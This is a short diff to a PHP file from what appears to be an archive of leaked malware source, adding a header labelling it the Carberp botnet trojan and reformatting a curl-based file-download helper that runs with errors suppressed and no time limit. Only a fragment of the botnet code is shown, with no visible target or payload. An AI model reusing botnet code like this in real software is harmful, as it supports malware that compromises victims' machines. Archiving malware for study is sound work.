@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(0);
@@ -6,7 +17,8 @@ ini_set('max_execution_time', 0);
 
 header('Content-Type: text/html; charset=utf-8');
 
-function donwload_file($link, $file){	$file_put = fopen($file, 'wb');
+function donwload_file($link, $file){
+	$file_put = fopen($file, 'wb');
 	$ch = curl_init();
 	curl_setopt($ch, CURLOPT_URL, $link);
 	curl_setopt($ch, CURLOPT_FILE, $file_put);
